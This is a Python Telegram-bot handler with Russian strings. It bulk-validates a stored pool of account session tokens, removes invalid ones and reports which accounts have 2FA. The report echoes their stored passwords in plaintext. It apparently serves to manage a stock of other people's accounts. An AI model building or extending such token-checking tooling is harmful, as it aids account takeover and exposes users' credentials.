@dp.callback_query(F.data == "admin_check_tokens")
async def cb_check_tokens(callback: types.CallbackQuery):
    if callback.from_user.id != ADMIN_ID:
        return await callback.answer("❌ Только для админа", show_alert=True)
    
    if not accounts:
        await callback.answer("Нет токенов для проверки", show_alert=True)
        return
    
    await callback.answer("🔍 Начинаю проверку...")
    msg = await callback.message.answer(f"🔍 Проверяю <b>{len(accounts)}</b> токенов...", parse_mode="HTML")
    
    valid_count = 0
    invalid_count = 0
    twofa_count = 0
    invalid_tokens = []
    twofa_list = []
    
    total = len(accounts)
    checked = 0
    
    for acc_id, acc in list(accounts.items()):
        checked += 1
        result = await validate_token(
            acc["token"], 
            acc["device_id"], 
            acc.get("device_info")
        )
        
        if result["valid"]:
            valid_count += 1
            if result.get("has_2fa"):
                twofa_count += 1
                phone = acc.get("phone", acc_id[:8])
                pwd = acc.get("password", "")
                pwd_info = f" [пароль: {pwd}]" if pwd else ""
                twofa_list.append(f"• {phone}{pwd_info}")
        else:
            invalid_count += 1
            phone = acc.get("phone", acc_id[:8])
            error = result.get("error", "неизвестная ошибка")
            invalid_tokens.append(f"• <code>{phone}</code>: {error}")
            del accounts[acc_id]
        
        if checked % 5 == 0 or checked == total:
            await msg.edit_text(
                f"🔍 Проверка: <b>{checked}</b>/{total}\n"
                f"✅ Валидных: {valid_count}\n"
                f"🔐 С 2FA: {twofa_count}\n"
                f"❌ Битых: {invalid_count}",
                parse_mode="HTML"
            )
    
    save_accounts()
    
    text = (
        f"📊 <b>Проверка завершена!</b>\n\n"
        f"✅ Рабочих: <b>{valid_count}</b>\n"
        f"🔐 С 2FA: <b>{twofa_count}</b>\n"
        f"❌ Удалено: <b>{invalid_count}</b>\n"
        f"📊 Осталось в базе: <b>{len(accounts)}</b>"
    )
    
    if twofa_list:
        text += f"\n\n<b>🔐 Токены с 2FA:</b>\n" + "\n".join(twofa_list[:15])
        if len(twofa_list) > 15:
            text += f"\n...и ещё {len(twofa_list) - 15}"
    
    if invalid_tokens:
        text += f"\n\n<b>❌ Удалённые токены:</b>\n" + "\n".join(invalid_tokens[:10])
        if len(invalid_tokens) > 10:
            text += f"\n...и ещё {len(invalid_tokens) - 10}"
    
    await msg.edit_text(text, parse_mode="HTML")

